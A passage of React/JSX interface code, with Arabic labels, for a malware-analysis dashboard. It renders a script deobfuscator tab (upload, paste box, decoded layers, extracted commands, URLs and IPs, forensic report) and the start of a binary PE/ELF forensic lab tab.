                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                    <FileCode className="w-3.5 h-3.5" />
                    MALICIOUS SCRIPT & PAYLOAD DEOBFUSCATOR • STATIC MULTI-LAYER UNWRAPPING + NEURAL-X CORE v3.5
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    محلل وسكربتات الحزم الخبيثة وفك التشويه (Malicious Script & Payload Deobfuscator)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    ارفع ملفات السكربتات المشبوهة (PowerShell, JavaScript, Python, VBScript, Batch, Bash) أو الصق الشفرة المموهة مباشرة. يقوم المحرك برمجياً وبشكل آمن بفك طبقات التمويه المتداخلة (Base64 / UTF-16LE / Zlib / String.fromCharCode / Format Strings / Hex / Caret & Backtick Evasion) واستخراج الأوامر والروابط الخفية ثم إرسالها إلى وحدة Neural-X Deobfuscator Core لإصدار التقرير الجنائي وتحديث سجل العمليات والتهديدات فوراً.
                  </p>
                </div>
                {scriptStaticResult && (
                  <button
                    onClick={downloadScriptJsonReport}
                    className="px-4 py-3 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2 shrink-0 self-start"
                  >
                    <Download className="w-4 h-4 text-[#D4AF37]" />
                    تصدير تقرير فك التشويه JSON
                  </button>
                )}
              </div>

              {/* Upload Dropzone + Direct Script Paste Area */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                <div
                  onDragOver={(e) => {
                    e.preventDefault();
                    setIsDraggingScript(true);
                  }}
                  onDragLeave={() => setIsDraggingScript(false)}
                  onDrop={(e) => {
                    e.preventDefault();
                    setIsDraggingScript(false);
                    const file = e.dataTransfer.files?.[0];
                    if (file) void handleScriptFileUpload(file);
                  }}
                  className={`border-2 border-dashed rounded-2xl p-6 text-center transition flex flex-col items-center justify-center space-y-3 ${
                    isDraggingScript
                      ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                      : 'border-gray-700 bg-gray-950/70 hover:border-[#D4AF37]/60'
                  }`}
                >
                  <div className="w-12 h-12 rounded-2xl bg-[#D4AF37]/15 border border-[#D4AF37]/30 flex items-center justify-center text-[#D4AF37]">
                    <Upload className="w-6 h-6" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-sm font-bold text-white">رفع ملف سكربت أو حمولة مشبوهة</h3>
                    <p className="text-[11px] text-gray-400 font-mono" dir="ltr">
                      .ps1 • .js • .py • .vbs • .bat • .cmd • .sh • .hta • .txt
                    </p>
                  </div>
                  <label className="cursor-pointer px-4 py-2.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold text-xs rounded-xl shadow hover:opacity-95 transition inline-flex items-center gap-2">
                    <FileCode className="w-4 h-4" />
                    اختيار ملف من الجهاز
                    <input
                      type="file"
                      accept=".ps1,.psm1,.psd1,.js,.mjs,.cjs,.jse,.py,.pyw,.vbs,.vbe,.wsf,.hta,.bat,.cmd,.sh,.bash,.txt,.log"
                      className="hidden"
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        e.target.value = '';
                        if (file) void handleScriptFileUpload(file);
                      }}
                    />
                  </label>
                </div>

                <div className="lg:col-span-2 bg-gray-950 border border-gray-800 rounded-2xl p-4 space-y-3">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <label className="text-xs font-bold text-[#D4AF37] flex items-center gap-2">
                      <Code className="w-4 h-4" />
                      أو الصق الكود / الحمولة المشبوهة للفك والتحليل الفوري
                    </label>
                    <input
                      type="text"
                      value={scriptFileNameInput}
                      onChange={(e) => setScriptFileNameInput(e.target.value)}
                      placeholder="اسم الملف (مثل dropper.ps1)"
                      dir="ltr"
                      className="px-3 py-1.5 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-gray-200 focus:outline-none focus:border-[#D4AF37] sm:w-56"
                    />
                  </div>
                  <textarea
                    value={scriptInputText}
                    onChange={(e) => setScriptInputText(e.target.value)}
                    placeholder="الصق هنا كود PowerShell -EncodedCommand أو JavaScript String.fromCharCode أو Python base64/zlib أو Batch..."
                    dir="ltr"
                    rows={5}
                    className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl text-xs font-mono text-emerald-300 focus:outline-none focus:border-[#D4AF37] resize-y"
                  />
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <span className="text-[11px] text-gray-500">
                      التحليل ثابت وآمن 100% داخل الذاكرة المعزولة بدون تنفيذ فعلي للكود (Zero eval).
                    </span>
                    <button
                      type="button"
                      disabled={scriptAnalyzing || !scriptInputText.trim()}
                      onClick={() => void runManualScriptDeobfuscation()}
                      className="px-5 py-2.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold text-xs rounded-xl shadow hover:opacity-95 transition inline-flex items-center gap-2 disabled:opacity-50"
                    >
                      {scriptAnalyzing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Sparkles className="w-4 h-4" />}
                      {scriptAnalyzing ? 'جاري فك التشويه والتحليل...' : 'فك التشويه وتشغيل Neural-X Core'}
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {scriptAnalyzing && (
              <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/40 p-10 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">
                  {scriptStage === 'deobfuscating'
                    ? 'جاري فك طبقات التشويه برمجياً واستخراج الأوامر والروابط الخفية...'
                    : 'جاري إرسال الشفرة المفكوكة والمؤشرات إلى Neural-X Deobfuscator Core لإصدار التقرير الجنائي...'}
                </h3>
                <p className="text-xs text-gray-400 font-mono">
                  Multi-Layer Static Unwrapping • Base64/UTF-16LE/Zlib • CharCode/Format Reconstruction • Neural-X Malware Core v3.5
                </p>
              </div>
            )}

            {scriptError && (
              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 text-red-300">
                <div className="flex items-start gap-3">
                  <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                  <div className="space-y-1">
                    <div className="text-sm font-bold text-red-200">تشخيص حالة تحليل السكربت</div>
                    <p className="text-xs leading-relaxed font-mono break-all">{scriptError}</p>
                  </div>
                </div>
                {scriptStaticResult && (
                  <button
                    onClick={() => void evaluateScriptWithDeobfuscatorCore(scriptStaticResult, scriptBufferRef.current || undefined)}
                    className="px-4 py-2 bg-red-500/20 hover:bg-red-500/30 border border-red-400/40 text-red-200 rounded-xl text-xs font-bold shrink-0"
                  >
                    إعادة التقييم عبر Neural-X Core
                  </button>
                )}
              </div>
            )}

            {scriptStaticResult && (
              <div className="space-y-6">
                {/* KPI Cards */}
                <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">اللغة البرمجية</span>
                    <div className="text-sm font-bold text-[#D4AF37] font-mono">{scriptStaticResult.language}</div>
                    <div className="text-[10px] text-gray-500 font-mono">
                      Entropy: {scriptStaticResult.entropy} • {scriptStaticResult.lineCount} سطر
                    </div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">طبقات التشويه المفكوكة</span>
                    <div className="text-2xl font-bold font-mono text-white">{scriptStaticResult.layersCount}</div>
                    <div className="text-[10px] text-gray-500">طبقات تم تفكيكها برمجياً</div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">الأوامر الخفية والخطيرة</span>
                    <div className={`text-2xl font-bold font-mono ${scriptStaticResult.extractedCommands.length > 0 ? 'text-red-400' : 'text-emerald-400'}`}>
                      {scriptStaticResult.extractedCommands.length}
                    </div>
                    <div className="text-[10px] text-gray-500">مشغلات تنفيذ/تحميل/ثبات</div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">الروابط وعناوين IP</span>
                    <div className="text-2xl font-bold font-mono text-amber-400">
                      {scriptStaticResult.extractedUrls.length + scriptStaticResult.extractedIps.length}
                    </div>
                    <div className="text-[10px] text-gray-500">
                      {scriptStaticResult.extractedUrls.length} رابط • {scriptStaticResult.extractedIps.length} IP
                    </div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">تقييم Neural-X الجنائي</span>
                    <div className={`text-sm font-bold ${scriptAiReport?.isMalicious ? 'text-red-400' : 'text-emerald-400'}`}>
                      {scriptAiReport ? `${scriptAiReport.riskLevel} (${scriptAiReport.threatScore}/100)` : 'بانتظار النتيجة'}
                    </div>
                    <div className="text-[10px] text-gray-500 truncate">
                      {scriptAiReport?.malwareFamilyOrType || scriptStaticResult.sha256.substring(0, 12) + '...'}
                    </div>
                  </div>
                </div>

                {/* Neural-X Malware Forensic Report Card */}
                {scriptAiReport && (
                  <div
                    className={`rounded-2xl border p-6 space-y-5 shadow-2xl ${
                      scriptAiReport.isMalicious || scriptAiReport.riskLevel === 'حرج' || scriptAiReport.riskLevel === 'مرتفع'
                        ? 'bg-gradient-to-br from-gray-900 via-gray-900 to-red-950/30 border-red-500/40'
                        : 'bg-gradient-to-br from-gray-900 via-gray-900 to-emerald-950/20 border-emerald-500/30'
                    }`}
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                      <div className="flex items-center gap-3">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center border ${
                            scriptAiReport.isMalicious
                              ? 'bg-red-500/15 border-red-500/40 text-red-400'
                              : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                          }`}
                        >
                          {scriptAiReport.isMalicious ? <ShieldAlert className="w-6 h-6" /> : <ShieldCheck className="w-6 h-6" />}
                        </div>
                        <div>
                          <h2 className="text-lg font-bold text-white">
                            {scriptAiReport.verdict} — {scriptAiReport.malwareFamilyOrType}
                          </h2>
                          <p className="text-xs text-gray-400 font-mono">
                            Engine: {scriptAiReport.modelUsed} • SHA-256: {scriptStaticResult.sha256.substring(0, 18)}... • تم التحديث في سجل العمليات والتهديدات
                          </p>
                        </div>
                      </div>
                      <span
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold border self-start md:self-auto ${
                          scriptAiReport.isMalicious
                            ? 'bg-red-500/20 text-red-300 border-red-500/40'
                            : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                        }`}
                      >
                        الخطورة: {scriptAiReport.riskLevel} ({scriptAiReport.threatScore}/100)
                      </span>
                    </div>

                    {scriptAiReport.attackTechniques?.length > 0 && (
                      <div className="flex flex-wrap gap-2">
                        {scriptAiReport.attackTechniques.map((tech, idx) => (
                          <span key={idx} className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 text-xs font-mono text-[#D4AF37]">
                            {tech}
                          </span>
                        ))}
                      </div>
                    )}

                    <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                      <div className="text-xs font-bold text-[#D4AF37]">الملخص الجنائي التنفيذي للكود</div>
                      <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">{scriptAiReport.executiveSummary}</p>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-red-400">الحمولات والأوامر الخفية المكتشفة</div>
                        <ul className="space-y-1.5">
                          {scriptAiReport.hiddenPayloadFindings.map((item, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800">
                              {item}
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-blue-400">تسلسل التنفيذ والسلوك البرمجي</div>
                        <ul className="space-y-1.5">
                          {scriptAiReport.behaviorBreakdown.map((step, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800">
                              {step}
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-emerald-400">التوصيات والاحتواء الفوري</div>
                        <ul className="space-y-1.5">
                          {scriptAiReport.recommendations.map((rec, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 mt-0.5 shrink-0" />
                              <span>{rec}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>
                  </div>
                )}

                {/* Programmatic Deobfuscation Details Inspector */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
                  <div className="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-gray-800">
                    <div className="flex flex-wrap gap-2">
                      <button
                        onClick={() => setScriptActiveSubTab('layers')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          scriptActiveSubTab === 'layers' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                        }`}
                      >
                        طبقات التمويه المفكوكة ({scriptStaticResult.layersCount})
                      </button>
                      <button
                        onClick={() => setScriptActiveSubTab('commands')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          scriptActiveSubTab === 'commands' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                        }`}
                      >
                        الأوامر والمسارات الخفية ({scriptStaticResult.extractedCommands.length})
                      </button>
                      <button
                        onClick={() => setScriptActiveSubTab('network')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          scriptActiveSubTab === 'network' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                        }`}
                      >
                        الروابط وعناوين IP ({scriptStaticResult.extractedUrls.length + scriptStaticResult.extractedIps.length})
                      </button>
                      <button
                        onClick={() => setScriptActiveSubTab('diff')}
                        className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                          scriptActiveSubTab === 'diff' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                        }`}
                      >
                        مقارنة الكود الأصلي والمفكوك
                      </button>
                    </div>
                    {scriptStaticResult.obfuscationTechniques.length > 0 && (
                      <div className="flex flex-wrap gap-1.5">
                        {scriptStaticResult.obfuscationTechniques.map((t, i) => (
                          <span key={i} className="px-2 py-1 rounded bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-[10px] font-mono">
                            {t}
                          </span>
                        ))}
                      </div>
                    )}
                  </div>

                  {scriptActiveSubTab === 'layers' && (
                    <div className="space-y-4">
                      {scriptStaticResult.layers.length === 0 ? (
                        <div className="p-6 bg-gray-950 rounded-xl border border-gray-800 text-center text-xs text-gray-400">
                          لم يتم رصد طبقات تشويه مشفرة متعددة الطبقات (Base64/Hex/CharCode) داخل هذا الملف — الشفرة مباشرة وتم فحص أوامرها وروابطها.
                        </div>
                      ) : (
                        scriptStaticResult.layers.map((layer) => (
                          <div key={layer.layerIndex} className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                            <div className="flex flex-wrap items-center justify-between gap-2">
                              <div className="flex items-center gap-2">
                                <span className="px-2.5 py-1 rounded bg-[#D4AF37] text-gray-950 text-xs font-bold font-mono">
                                  Layer {layer.layerIndex}
                                </span>
                                <span className="text-xs font-bold text-white">{layer.technique}</span>
                              </div>
                              <button
                                onClick={() => copyToClipboard(layer.decodedFull, `layer-${layer.layerIndex}`)}
                                className="px-2.5 py-1 rounded bg-gray-900 hover:bg-gray-800 border border-gray-700 text-[11px] text-gray-300 flex items-center gap-1"
                              >
                                <Copy className="w-3 h-3 text-[#D4AF37]" />
                                نسخ الناتج
                              </button>
                            </div>
                            <p className="text-xs text-gray-400">{layer.description}</p>
                            <pre className="p-3 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-emerald-300 overflow-x-auto whitespace-pre-wrap break-all max-h-64" dir="ltr">
                              {layer.decodedFull}
                            </pre>
                          </div>
                        ))
                      )}
                    </div>
                  )}

                  {scriptActiveSubTab === 'commands' && (
                    <div className="space-y-4">
                      {scriptStaticResult.extractedCommands.length === 0 ? (
                        <div className="p-6 bg-gray-950 rounded-xl border border-gray-800 text-center text-xs text-gray-400">
                          لا توجد أوامر نظام خطيرة أو مشغلات تنفيذ ديناميكية مطابقة للأنماط القياسية.
                        </div>
                      ) : (
                        <div className="space-y-2.5">
                          {scriptStaticResult.extractedCommands.map((cmd, idx) => (
                            <div key={idx} className="p-3.5 bg-gray-950 border border-gray-800 rounded-xl space-y-2">
                              <div className="flex flex-wrap items-center justify-between gap-2">
                                <div className="flex items-center gap-2">
                                  <span
                                    className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                      cmd.severity === 'critical'
                                        ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                                        : cmd.severity === 'high'
                                        ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                                        : 'bg-blue-500/20 text-blue-300 border border-blue-500/40'
                                    }`}
                                  >
                                    {cmd.severity} • {cmd.category}
                                  </span>
                                  <span className="text-xs font-bold text-white">{cmd.command}</span>
                                </div>
                                <span className="text-[10px] font-mono text-gray-400">
                                  {cmd.foundInLayer === 0 ? 'الكود الأصلي' : `الطبقة المفكوكة #${cmd.foundInLayer}`}
                                </span>
                              </div>
                              <div className="p-2 bg-gray-900 rounded border border-gray-800 font-mono text-[11px] text-amber-300 break-all" dir="ltr">
                                {cmd.context}
                              </div>
                            </div>
                          ))}
                        </div>
                      )}

                      {scriptStaticResult.registryAndPaths.length > 0 && (
                        <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-2">
                          <div className="text-xs font-bold text-[#D4AF37]">مفاتيح التسجيل ومسارات الملفات المستخرجة (Registry & Paths)</div>
                          <div className="flex flex-wrap gap-2" dir="ltr">
                            {scriptStaticResult.registryAndPaths.map((p, idx) => (
                              <span key={idx} className="px-2.5 py-1 rounded bg-gray-900 border border-gray-800 text-[11px] font-mono text-gray-300 break-all">
                                {p}
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                  {scriptActiveSubTab === 'network' && (
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="text-xs font-bold text-[#D4AF37]">الروابط الخفية والمستخرجة (URLs)</div>
                        {scriptStaticResult.extractedUrls.length === 0 ? (
                          <div className="text-xs text-gray-500">لم يتم العثور على روابط URL داخل السكربت أو طبقاته.</div>
                        ) : (
                          <div className="space-y-2">
                            {scriptStaticResult.extractedUrls.map((u, idx) => (
                              <div key={idx} className="p-2.5 bg-gray-900 border border-gray-800 rounded-lg flex items-center justify-between gap-2">
                                <div className="min-w-0">
                                  <div className="text-xs font-mono text-red-300 truncate" dir="ltr">
                                    {u.url}
                                  </div>
                                  <div className="text-[10px] text-gray-500">
                                    {u.isObfuscatedSource ? `مُستخرج من الطبقة المموهة #${u.foundInLayer}` : 'موجود في الطبقة الأصلية'}
                                  </div>
                                </div>
                                <button
                                  onClick={() => {
                                    setActiveTab('threat_intel');
                                    void runThreatIntelLookup(u.domain);
                                  }}
                                  className="px-2.5 py-1 rounded bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 border border-[#D4AF37]/40 text-[#D4AF37] text-[10px] font-bold shrink-0"
                                >
                                  فحص النطاق OSINT
                                </button>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>

                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="text-xs font-bold text-emerald-400">عناوين الشبكة المستخرجة (IP Addresses)</div>
                        {scriptStaticResult.extractedIps.length === 0 ? (
                          <div className="text-xs text-gray-500">لم يتم العثور على عناوين IPv4 داخل السكربت أو طبقاته.</div>
                        ) : (
                          <div className="space-y-2">
                            {scriptStaticResult.extractedIps.map((ipObj, idx) => (
                              <div key={idx} className="p-2.5 bg-gray-900 border border-gray-800 rounded-lg flex items-center justify-between gap-2">
                                <div>
                                  <div className="text-xs font-mono font-bold text-white" dir="ltr">
                                    {ipObj.ip}
                                  </div>
                                  <div className="text-[10px] text-gray-500">
                                    {ipObj.isPrivate ? 'شبكة داخلية (Private)' : 'عنوان عام خارجي (Public)'} • الطبقة #{ipObj.foundInLayer}
                                  </div>
                                </div>
                                {!ipObj.isPrivate && (
                                  <button
                                    onClick={() => {
                                      setActiveTab('threat_intel');
                                      void runThreatIntelLookup(ipObj.ip);
                                    }}
                                    className="px-2.5 py-1 rounded bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 border border-[#D4AF37]/40 text-[#D4AF37] text-[10px] font-bold shrink-0"
                                  >
                                    فحص IP عالمياً
                                  </button>
                                )}
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {scriptActiveSubTab === 'diff' && (
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-2">
                        <div className="text-xs font-bold text-gray-400">الكود الأصلي المموه (Raw Input)</div>
                        <pre className="p-3 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre-wrap break-all max-h-96" dir="ltr">
                          {scriptStaticResult.originalCode}
                        </pre>
                      </div>
                      <div className="bg-gray-950 border border-emerald-500/30 rounded-xl p-4 space-y-2">
                        <div className="flex items-center justify-between">
                          <div className="text-xs font-bold text-emerald-400">الحمولة النهائية بعد فك التشويه (Deobfuscated Output)</div>
                          <button
                            onClick={() => copyToClipboard(scriptStaticResult.finalDeobfuscatedCode, 'deobfuscated-final')}
                            className="px-2 py-1 rounded bg-gray-900 border border-gray-700 text-[10px] text-gray-300 flex items-center gap-1"
                          >
                            <Copy className="w-3 h-3 text-[#D4AF37]" />
                            نسخ
                          </button>
                        </div>
                        <pre className="p-3 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-emerald-300 overflow-x-auto whitespace-pre-wrap break-all max-h-96" dir="ltr">
                          {scriptStaticResult.finalDeobfuscatedCode}
                        </pre>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab: Deep Binary, PE/ELF Headers & Strings Forensic Lab */}
        {isTabVisible('binary_lab') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 border-gray-800 p-8 shadow-2xl space-y-6">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div className="space-y-2 max-w-3xl">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                    <Cpu className="w-3.5 h-3.5" />
                    DEEP BINARY, PE/ELF HEADERS & STRINGS FORENSIC LAB • SOVEREIGN CORE ENGINE v3.5
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    مختبر الفحص الجنائي العميق للملفات التنفيذية والباينري (Binary, PE/ELF & Deep Strings Lab)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    ارفع أي ملف تنفيذي أو ثنائي أو قاعدة بيانات أو ملف نصي (`.exe`, `.dll`, `.sys`, `.elf`, `.so`, `.bin`, `.dmp`, `.db`, `.txt`) أو أدخل بايتات Hex مباشرة. يقوم المحرك محلياً بقراءة ترويسات PE/ELF ومقاطع الذاكرة (Sections & Entropy)، وكشف دوال الحقن والتجسس (Win32/POSIX APIs)، واستخراج نصوص ASCII/UTF-16LE، ثم إرسال الأدلة إلى وحدة Sovereign Binary Telemetry Core لتحديث التهديدات وسجلات العمليات فوراً.
                  </p>
                </div>
                {binaryLabStaticResult && (
                  <button
                    onClick={downloadBinaryLabJsonReport}
                    className="px-4 py-3 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2 shrink-0 self-start"
                  >
                    <Download className="w-4 h-4 text-[#D4AF37]" />
                    تصدير التقرير الثنائي JSON
                  </button>
                )}
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
                {/* Real File Upload Dropzone */}
                <div
                  onDragOver={(e) => {
                    e.preventDefault();
                    setIsDraggingBinaryLab(true);
                  }}
                  onDragLeave={() => setIsDraggingBinaryLab(false)}
                  onDrop={(e) => {
                    e.preventDefault();
                    setIsDraggingBinaryLab(false);
                    const file = e.dataTransfer.files?.[0];
                    if (file) void handleBinaryLabFileUpload(file);
                  }}
                  className={`border-2 border-dashed rounded-2xl p-6 text-center transition flex flex-col items-center justify-center space-y-3 ${
                    isDraggingBinaryLab
                      ? 'border-[#D4AF37] bg-[#D4AF37]/10'
                      : 'border-gray-700 bg-gray-950/70 hover:border-[#D4AF37]/60'
                  }`}
                >
                  <div className="w-12 h-12 rounded-2xl bg-[#D4AF37]/15 border border-[#D4AF37]/30 flex items-center justify-center text-[#D4AF37]">
                    <Upload className="w-6 h-6" />
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-sm font-bold text-white">رفع ملف Binary / Executable / DB / Text</h3>
                    <p className="text-[11px] text-gray-400 font-mono" dir="ltr">
                      .exe • .dll • .sys • .elf • .so • .bin • .dmp • .db • .txt
                    </p>
                  </div>
                  <label className="cursor-pointer px-4 py-2.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold text-xs rounded-xl shadow hover:opacity-95 transition inline-flex items-center gap-2">
                    <Cpu className="w-4 h-4" />
                    رفع ملف للفحص الثنائي
                    <input
                      type="file"
                      className="hidden"
                      onChange={(e) => {
                        const file = e.target.files?.[0];
                        e.target.value = '';
                        if (file) void handleBinaryLabFileUpload(file);
                      }}
                    />
                  </label>
                </div>

                {/* Direct Hex / Raw Artifact Input */}
                <div className="lg:col-span-2 bg-gray-950 border border-gray-800 rounded-2xl p-4 space-y-3">
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => setBinaryLabInputMode('hex')}
                        className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
                          binaryLabInputMode === 'hex' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-900 text-gray-300 border border-gray-800'
                        }`}
                      >
                        إدخال بايتات Hex
                      </button>
                      <button
                        type="button"
                        onClick={() => setBinaryLabInputMode('text')}
                        className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
                          binaryLabInputMode === 'text' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-900 text-gray-300 border border-gray-800'
                        }`}
                      >
                        إدخال نص / سجل خام
                      </button>
                    </div>
                    <input
                      type="text"
                      value={binaryLabFileNameInput}
                      onChange={(e) => setBinaryLabFileNameInput(e.target.value)}
                      placeholder="اسم العينة (مثل sample.exe)"
                      dir="ltr"
                      className="px-3 py-1.5 bg-gray-900 border border-gray-800 rounded-lg text-xs font-mono text-gray-200 focus:outline-none focus:border-[#D4AF37] sm:w-52"
                    />
                  </div>
                  <textarea
                    value={binaryLabRawInput}
                    onChange={(e) => setBinaryLabRawInput(e.target.value)}
                    placeholder={
                      binaryLabInputMode === 'hex'
                        ? 'أدخل بايتات Hex للفحص مثل: 4D 5A 90 00 03 00 00 00 ... (ترويسة PE / ELF / Shellcode)'
                        : 'أدخل أي نصوص أو مؤشرات أو مقتطفات ثنائية لتحويلها لبايتات وفحصها...'
                    }
                    dir="ltr"
                    rows={4}
                    className="w-full p-3 bg-gray-900 border border-gray-800 rounded-xl text-xs font-mono text-amber-300 focus:outline-none focus:border-[#D4AF37] resize-y"
                  />
                  <div className="flex flex-wrap items-center justify-between gap-2">
                    <span className="text-[11px] text-gray-500">
                      قراءة البايتات وحساب الإنتروبيا وفك الترويسات تتم برمجياً داخل المتصفح.
                    </span>
                    <button
                      type="button"
                      disabled={binaryLabAnalyzing || !binaryLabRawInput.trim()}
                      onClick={() => void runManualBinaryLabAnalysis()}
                      className="px-5 py-2.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold text-xs rounded-xl shadow hover:opacity-95 transition inline-flex items-center gap-2 disabled:opacity-50"
                    >
                      {binaryLabAnalyzing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Sparkles className="w-4 h-4" />}
                      {binaryLabAnalyzing ? 'جاري الفحص العميق...' : 'فحص البايتات وتشغيل Sovereign Core'}
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {binaryLabAnalyzing && (
              <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/40 p-10 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">
                  {binaryLabStage === 'parsing'
                    ? 'جاري تحليل الترويسات الثنائية (PE/ELF) والمقاطع واستخراج النصوص والدوال محلياً...'
                    : 'جاري إرسال النتائج المستخرجة إلى Sovereign Binary Telemetry Core لإصدار التقرير الجنائي...'}
                </h3>
                <p className="text-xs text-gray-400 font-mono">
                  DataView PE/ELF Header Parser • Sliding-Window Entropy • Win32/POSIX API Scanner • Threat Hunting Daemon v3.5
                </p>
              </div>
            )}

            {binaryLabError && (
